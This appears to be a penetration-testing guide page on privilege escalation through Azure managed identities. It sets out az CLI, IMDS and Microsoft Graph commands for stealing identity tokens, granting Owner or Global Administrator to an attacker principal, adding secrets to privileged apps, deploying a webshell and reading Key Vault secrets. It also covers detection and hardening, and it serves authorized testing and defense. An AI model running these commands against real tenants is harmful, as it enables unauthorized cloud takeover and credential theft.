---
cstg_id: CSTG-AZURE-MANAGED-IDENTITIES-PRIVESC
title: "AZURE Managed Identities - Privilege Escalation"
provider: azure
service: managed-identities
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Ability to obtain a managed-identity token (IMDS/MSI endpoint access on a compromised resource, or control-plane write to attach an identity)"
  - "One or more of the escalation-enabling permissions documented per subsection below, held by the reachable identity, e.g.:"
  - "Microsoft.Authorization/roleAssignments/write (User Access Administrator / RBAC Administrator)"
  - "Microsoft.Compute/virtualMachines/runCommand/action"
  - "Microsoft.Web/sites/write, Microsoft.Web/sites/publish/action"
  - "Microsoft.Automation/automationAccounts/runbooks/write"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action"
  - "Microsoft.KeyVault/vaults/secrets/read (data action)"
  - "Graph: RoleManagement.ReadWrite.Directory, AppRoleAssignment.ReadWrite.All, Application.ReadWrite.All"
tools:
  - az cli (azure-cli)
  - Azure Instance Metadata Service (IMDS)
  - Microsoft Graph API
  - MicroBurst
  - PowerZure
  - ROADtools
  - AzureHound / BloodHound
references:
  - "https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments-steps"
  - "https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/managed-identity-best-practice-recommendations"
  - "https://hackingthe.cloud/azure/abusing-managed-identities/"
  - "https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-privilege-escalation-using-managed-identities/"
  - "https://github.com/NetSPI/MicroBurst"
  - "https://github.com/hausec/PowerZure"
  - "https://learn.microsoft.com/en-us/graph/permissions-reference"
license: CC BY-SA 4.0
---

## Summary

Managed identities are one of the most common privilege-escalation primitives in Azure because they decouple "who can run code on a resource" from "what the resource's identity is allowed to do." Two distinct escalation patterns exist:

1. **Use of an over-privileged identity.** An operator who controls a resource (or can run code on it) obtains that resource's managed-identity token from the local metadata endpoint and inherits every Azure RBAC role assignment and Entra/Graph permission the identity holds. If the identity is more privileged than the operator's starting context, this is escalation.
2. **Attachment / abuse of a more-privileged identity.** An operator with control-plane write on a resource attaches an existing, more-privileged user-assigned identity to a resource they control, or uses a "grant role" / "assign identity" permission to widen an identity's privileges, then obtains tokens for it.

The objective is to move from an initial low-privilege foothold to control of a managed identity whose effective permissions exceed the operator's, ultimately reaching Owner/User Access Administrator at a high scope or tenant-level Graph permissions. This page assumes the enumeration in [Managed Identities - Enumeration](../02-services/azure-managed-identities-enum.md) has identified which identities are over-privileged. Token theft and reuse to reach other systems is covered in [Managed Identities - Lateral Movement](../04-lateral-movement/azure-managed-identities-lateral.md).

## Prerequisites

- An assumed-breach foothold: control of, or code execution on, a resource that carries a managed identity, **or** control-plane write permissions over resources/identities.
- For token theft on a resource: network access to the local Instance Metadata Service (IMDS) at `169.254.169.254` (VMs/VMSS) or to the App Service / Functions MSI endpoint (`IDENTITY_ENDPOINT` + `IDENTITY_HEADER` environment variables).
- For attachment-based escalation: a starting principal holding one of the write permissions detailed below.
- An enumeration baseline of identities and their role assignments so the operator knows which identity to target.

## Enumeration

Refer to [Managed Identities - Enumeration](../02-services/azure-managed-identities-enum.md) for full discovery. The escalation-relevant subset:

```bash
# Which identities are over-privileged? List high-impact role assignments
az role assignment list --all \
  --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor' || roleDefinitionName=='User Access Administrator' || roleDefinitionName=='Role Based Access Control Administrator']" -o table

# Which resources (that I can reach) carry which identity?
az graph query -q "Resources | where isnotnull(identity) | project name, type, resourceGroup, identity"

# Graph permissions of a candidate identity's service principal
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals/<sp-object-id>/appRoleAssignments"
```

Obtaining a token from the resource you already control (the foundation of pattern 1):

```bash
# On a Linux/Windows Azure VM, via IMDS (system-assigned)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# For a specific user-assigned identity on the VM, add &client_id=<clientId> (or &mi_res_id=<resource-id>)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<clientId>"

# Inside App Service / Functions
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

The returned `access_token` can be used with the CLI or directly as a Bearer token:

```bash
az login --identity                  # if running on the resource itself
# or use the raw token:
az rest --method get --headers "Authorization=Bearer <token>" \
  --url "https://management.azure.com/subscriptions?api-version=2022-12-01"
```

## Misconfigurations & Findings

- A reachable resource carries an identity with **Owner**, **Contributor**, **User Access Administrator**, or **RBAC Administrator** at a scope broader than the operator already controls.
- A resource the operator can attach identities to (Contributor/`*/write`) exists alongside an unattached, high-privilege user-assigned identity.
- An identity holds **role-assignment write** (`Microsoft.Authorization/roleAssignments/write`) without a `roleAssignmentConditions` constraint limiting which roles/principals it can grant — enabling unconstrained self-escalation.
- An identity holds high-impact **Graph application permissions** (`RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`, `Application.ReadWrite.All`), turning resource compromise into directory takeover.
- An identity can read **Key Vault** secrets/keys that are themselves higher-privilege credentials.

## Exploitation

Each subsection below is keyed to the specific permission (held by the reachable managed identity, or by the starting principal) that enables the path.

### Microsoft.Authorization/roleAssignments/write

This is the canonical Azure self-escalation. Held by **User Access Administrator**, **RBAC Administrator**, and **Owner**. An operator controlling an identity with this permission grants a high-privilege role to a principal they control (the identity itself, a user, or a new service principal):

```bash
# Grant Owner at subscription scope to the current identity (or any chosen principal)
az role assignment create \
  --assignee <attacker-controlled-principalId> \
  --role "Owner" \
  --scope "/subscriptions/<sub-id>"
```

RBAC Administrator is constrained only if `roleAssignmentConditions` were attached; without conditions it is equivalent to User Access Administrator for escalation. After the assignment propagates, re-request a token and operate as Owner.

### Microsoft.ManagedIdentity/userAssignedIdentities/assign/action (+ resource write)

With permission to assign a user-assigned identity and to write a resource, an operator attaches a *more-privileged* existing UAMI to a resource they can run code on, then steals its token:

```bash
# Attach a privileged UAMI to a VM the operator controls
az vm identity assign -g <rg> -n <vm-name> \
  --identities "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<priv-uami>"
# Then request that identity's token via IMDS with &client_id=<priv-uami-clientId>
```

The same applies to App Service, Function Apps, Container Instances, and AKS pods (via the kubelet/workload identity binding).

### Microsoft.Compute/virtualMachines/runCommand/action (and /extensions/write)

Run Command and custom-script/extension execution let an operator run arbitrary code as SYSTEM/root on a VM that carries a privileged identity, then harvest its token — escalating from "can manage the VM" to "controls the VM's identity":

```bash
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
```

`Microsoft.Compute/virtualMachines/extensions/write` (CustomScriptExtension) achieves the same outcome. For VM scale sets the equivalent is `Microsoft.Compute/virtualMachineScaleSets/*/runCommand` / extension write.

### Microsoft.Web/sites/write and Microsoft.Web/sites/publish/action

Deploying code to an App Service or Function App that carries a privileged identity runs that code with the identity's token endpoint available, again converting "deploy" rights into the identity's full privilege:

```bash
# Deploy a webshell / token-dumper, then read IDENTITY_ENDPOINT/IDENTITY_HEADER from the worker
az webapp deployment source config-zip -g <rg> -n <app> --src payload.zip
```

### Microsoft.Automation/automationAccounts/runbooks/write (+ /start/action)

Automation Accounts frequently carry a Run As or managed identity with broad rights. Authoring and starting a runbook executes attacker code in the Automation sandbox under that identity:

```bash
az automation runbook create -g <rg> --automation-account-name <aa> --name pwn --type PowerShell
# upload content that requests a token, then:
az automation runbook start -g <rg> --automation-account-name <aa> --name pwn
```

### RoleManagement.ReadWrite.Directory (Graph application permission)

An identity with this Graph permission can assign Entra directory roles — including Global Administrator — to any principal, achieving tenant takeover. Using the identity's Graph token:

```bash
# Add the attacker principal to the Global Administrator role
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/directoryRoles/<globalAdminRoleObjectId>/members/\$ref" \
  --headers "Content-Type=application/json" \
  --body '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/<attacker-objectId>"}'
```

### AppRoleAssignment.ReadWrite.All / Application.ReadWrite.All (Graph)

`AppRoleAssignment.ReadWrite.All` lets the identity grant itself (or another principal) additional Graph app-roles — for example escalating to `RoleManagement.ReadWrite.Directory` and then following the path above. `Application.ReadWrite.All` lets the identity add credentials (a client secret or certificate) to any application/service principal in the tenant and then authenticate as it:

```bash
# Add a new client secret to a privileged app, then sign in as that app
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/applications/<appObjectId>/addPassword" \
  --body '{"passwordCredential":{"displayName":"x"}}'
```

### Microsoft.KeyVault/vaults/secrets/read (data action)

If the identity has Key Vault data-plane read, it can pull stored credentials (service-principal secrets, connection strings, SSH keys) that may themselves be higher-privileged than the identity:

```bash
az keyvault secret list --vault-name <kv>
az keyvault secret show --vault-name <kv> --name <secret>
```

## Detection & Logging

- **Azure Activity Logs** record `Microsoft.Authorization/roleAssignments/write` (new role assignments — a primary escalation signal), `Microsoft.Compute/virtualMachines/runCommand/action`, extension writes, `Microsoft.Web/sites/*` deployments, runbook create/start, and `Microsoft.ManagedIdentity/.../assign/action`. Alert on role assignments granting Owner/User Access Administrator/RBAC Administrator, especially to a managed identity or newly created principal.
- **Entra ID audit logs** record directory role membership changes (e.g. "Add member to role" → Global Administrator), app-role assignment grants, and `addPassword`/`addKey` (credential added to application/service principal) — high-fidelity tenant-takeover signals.
- **Entra ID sign-in logs** show the managed identity's service principal acquiring tokens for `https://management.azure.com/` and `https://graph.microsoft.com/`; a managed identity suddenly calling Graph privileged endpoints is anomalous.
- Run Command / extension execution and the IMDS token request leave host-level traces (process execution, outbound to `169.254.169.254`) collectible via endpoint logging and Defender for Servers.
- **Microsoft Defender for Cloud** alerts on suspicious role assignments and managed-identity abuse; **Entra Permissions Management** flags privilege creep.

## Remediation & Hardening

- Never assign Owner, Contributor, User Access Administrator, or RBAC Administrator to a managed identity unless strictly required; scope tightly and prefer least-privilege built-in roles.
- Constrain `roleAssignments/write` with `roleAssignmentConditions` (delegated role-assignment management) so an identity cannot grant arbitrary roles/principals.
- Do not grant managed identities high-impact Graph permissions (`RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`, `Application.ReadWrite.All`); review existing grants and remove them.
- Separate the right to manage a resource (deploy, run-command, extensions) from the privileges of the identity it carries; treat run-command/extension/deploy permissions as equivalent to the identity's full power and restrict them accordingly.
- Use Azure Policy to deny attaching privileged identities to lower-trust resources and to deny high-risk role assignments to managed identities.
- Enable Defender for Cloud, route Activity and Entra logs to a SIEM, and alert on the specific operations listed above.

## Tools

- **az cli** / **Azure REST / IMDS** — token acquisition, role assignment, resource and identity manipulation.
- **Microsoft Graph API** — directory role and app-role escalation, credential addition.
- **MicroBurst** / **PowerZure** — Azure attack tooling automating token theft, runbook abuse, and role manipulation.
- **ROADtools** — Entra analysis to identify escalation-enabling app-role grants.
- **AzureHound / BloodHound** — graph the shortest path from a foothold to a privileged identity/role.

## References

- Acquire a token using a VM's managed identity — Microsoft Learn
- Steps to assign an Azure role — Microsoft Learn
- Managed identity best-practice recommendations — Microsoft Learn
- Graph permissions reference — Microsoft Learn
- Abusing managed identities — hackingthe.cloud
- Azure privilege escalation using managed identities — NetSPI
- MicroBurst — NetSPI (GitHub); PowerZure — hausec (GitHub)
